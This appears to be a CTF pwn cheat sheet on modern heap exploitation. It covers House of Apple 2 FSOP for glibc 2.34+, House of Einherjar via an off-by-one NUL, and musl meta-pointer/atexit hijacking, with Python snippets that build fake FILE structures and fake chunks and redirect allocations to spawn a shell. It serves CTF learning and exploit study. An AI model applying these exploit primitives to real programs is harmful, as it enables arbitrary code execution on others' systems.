# CTF Pwn - Advanced Heap (2024-2026)

Modern glibc / musl heap exploits from 2024-2026. For the canonical toolbox (UAF, classic House-of-* primitives, tcache stashing, ret2dlresolve, JIT), see [advanced.md](advanced.md).

## Table of Contents
- [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2--fsop-for-glibc-234-0xfun-2026)
- [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar--off-by-one-null-byte-0xfun-2026)
- [musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)](#musl-libc-heap-exploitation--meta-pointer--atexit-unbreakable-2026)

---

## House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)

**When to use:** Modern glibc (2.34+) removed `__free_hook`/`__malloc_hook`. House of Apple 2 uses FSOP via `_IO_wfile_jumps`.

**Full chain:** UAF → leak libc (unsorted bin fd/bk) → leak heap (safe-linking mangled NULL) → tcache poisoning to `_IO_list_all` → fake FILE → exit triggers shell.

**Fake FILE structure requirements:**
```python
fake_file = flat({
    0x00: b' sh\x00',           # _flags = " sh\x00" (fp starts with " sh")
    0x20: p64(0),                # _IO_write_base = 0
    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
    0x88: p64(heap_addr),        # _lock (valid writable address)
    0xa0: p64(wide_data_addr),   # _wide_data pointer
    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
}, filler=b'\x00')

fake_wide_data = flat({
    0x18: p64(0),                # _IO_write_base = 0
    0x30: p64(0),                # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable), # _wide_vtable
})

fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),  # __doallocate offset
})
```

**Trigger chain:** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)` where fp = `" sh\x00..."`.

**Safe-linking (glibc 2.32+):** tcache fd pointers are mangled: `fd = ptr ^ (chunk_addr >> 12)`. To poison tcache:
```python
# When writing to freed chunk, mangle the target address:
mangled_fd = target_addr ^ (current_chunk_addr >> 12)
```

---

## House of Einherjar — Off-by-One Null Byte (0xFun 2026)

**Vulnerability:** Off-by-one NUL at end of `malloc_usable_size` clears `PREV_INUSE` of next chunk.

**Exploit chain:**
1. Set `prev_size` of next chunk to create fake backward consolidation
2. Forge largebin-style chunk with `fd/bk` AND `fd_nextsize/bk_nextsize` all pointing to self (passes `unlink_chunk()`)
3. After consolidation, overlapping chunks enable tcache poisoning
4. Overwrite `stdout` or `_IO_list_all` for FSOP

**Key requirement:** Self-pointing unlink trick is essential. The fake chunk must pass `unlink_chunk()` which checks `FD->bk == P && BK->fd == P` and (for large chunks) `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`:

```python
# Fake chunk layout (at known heap address fake_addr):
#   chunk header:
#     prev_size:      don't care
#     size:           target_size | PREV_INUSE  (must match consolidation math)
#     fd:             fake_addr   (self-referencing)
#     bk:             fake_addr   (self-referencing)
#     fd_nextsize:    fake_addr   (self-referencing, needed for large chunks)
#     bk_nextsize:    fake_addr   (self-referencing)

fake_chunk = flat({
    0x00: p64(0),                # prev_size
    0x08: p64(target_size | 1),  # size with PREV_INUSE set
    0x10: p64(fake_addr),        # fd -> self
    0x18: p64(fake_addr),        # bk -> self
    0x20: p64(fake_addr),        # fd_nextsize -> self
    0x28: p64(fake_addr),        # bk_nextsize -> self
}, filler=b'\x00')

# Victim chunk's prev_size must equal distance from fake_chunk to victim
# Off-by-one NUL clears victim's PREV_INUSE bit
# free(victim) triggers backward consolidation: merges with fake_chunk
# Result: consolidated chunk overlaps other live allocations
```

**Setup sequence:**
1. Allocate chunks A (large, will hold fake chunk), B (filler), C (victim with off-by-one)
2. Write fake chunk into A with self-referencing pointers
3. Trigger off-by-one on C to clear B's PREV_INUSE and set B's prev_size
4. Free B → consolidates backward into A → overlapping chunk
5. Allocate over the overlap region to control other live chunks

---

## musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)

**Pattern (atypical-heap):** Binary linked against musl libc (not glibc). musl's allocator uses `meta` structures instead of chunk headers. OOB read leaks `meta->mem` pointer; arbitrary write redirects allocation to controlled address.

**musl allocator layout:**
- Each allocation belongs to a `group`, managed by a `meta` struct
- `meta->mem` points to the group's data region
- First `0x70`-class allocation places `meta0->mem` at a fixed offset from PIE base (e.g., `chall_base + 0x3f20`)

**Exploitation chain:**
1. **Leak meta pointer** — OOB read at offset `0x80` from a heap allocation reads the `meta` struct pointer
2. **Recover PIE base** — `meta0->mem` is at a fixed offset from the binary base
3. **Redirect allocation** — Overwrite `meta->mem` to point at a live group or target address. Next allocation from that group returns attacker-controlled memory
4. **atexit hijack** — Overwrite musl's `atexit` handler list with `system("cat flag")`. Normal program exit triggers code execution

```python
# Leak meta pointer via OOB read
meta_ptr = leak_at_offset(0x80)
pie_base = meta_ptr - 0x3f20  # fixed offset for first 0x70 allocation

# Rewrite meta->mem to redirect future allocations
write_at(meta_ptr + META_MEM_OFFSET, target_addr)

# Next alloc returns target_addr — use to overwrite atexit handlers
alloc_and_write(atexit_list_addr, system_addr, "cat flag")
```

**Key insight:** musl's allocator metadata (`meta` structs) is stored separately from heap data, but predictable offsets link them to the binary base. Unlike glibc, musl has no safe-linking or tcache — corrupting `meta->mem` gives direct allocation control. The `atexit` handler list is a simpler code execution target than glibc's `__free_hook` (which is removed in 2.34+).

**Detection:** Binary uses musl libc (check `ldd`, or `strings binary | grep musl`). Menu-style heap challenges with read/write primitives.

---

